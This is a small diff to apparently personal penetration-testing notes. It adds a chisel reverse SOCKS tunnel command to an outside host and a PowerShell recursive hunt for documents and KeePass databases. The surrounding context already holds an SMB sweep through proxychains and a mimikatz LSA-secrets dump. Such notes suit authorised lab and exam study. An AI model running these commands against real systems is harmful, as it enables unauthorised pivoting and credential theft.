@@ -3470,6 +3470,9 @@ sudo proxychains -q crackmapexec smb 172.16.211.0/24
 ```
 mimikatz
 lsadump::secrets 
+.\chisel.exe client 192.168.45.193:8080 R:socks
 
 Useful file command
+```
 Get-ChildItem -Path C:\Users\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx, *.kdbx, *.log -File -Recurse -ErrorAction SilentlyContinue
+```
